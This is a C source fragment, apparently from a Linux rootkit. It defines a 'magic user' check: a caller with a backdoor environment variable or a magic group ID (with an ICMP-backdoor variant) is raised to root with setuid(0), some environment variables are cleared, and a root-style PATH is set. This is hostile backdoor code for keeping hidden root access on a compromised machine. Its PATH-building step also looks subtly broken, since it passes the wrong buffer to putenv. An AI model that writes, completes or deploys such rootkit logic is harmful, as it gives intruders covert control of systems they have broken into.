void putbdvlenv(void){
    putenv(HOME_VAR);
    char *pathv = getenv("PATH");
    if(pathv != NULL){
        char *e="PATH=/usr/local/sbin:/usr/sbin:/sbin:%s",
             buf[strlen(e)+strlen(pathv)+2];
        snprintf(buf, sizeof(buf), "%s%s", e, pathv);
        putenv(pathv);
    }else putenv("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin");
}

int magicusr(void){
#ifndef HIDE_SELF
    return 1;
#else
    if(magician != 0)
      goto nopenope;

    if(!notuser(0) && getenv(BD_VAR) != NULL){
        magician = 1;
        goto nopenope;
    }

    gid_t mygid = getgid(),
          magicgid = readgid();
    if(mygid == magicgid
       #ifdef USE_ICMP_BD
       || mygid == magicgid-1
       #endif
       ){
        magician = 1;
        setuid(0);
    }

nopenope:
    if(magician){
        for(int i = 0; i < UNSETVARS_SIZE; i++)
            unsetenv(unsetvars[i]);
        putbdvlenv();
    }
    return magician;
#endif
}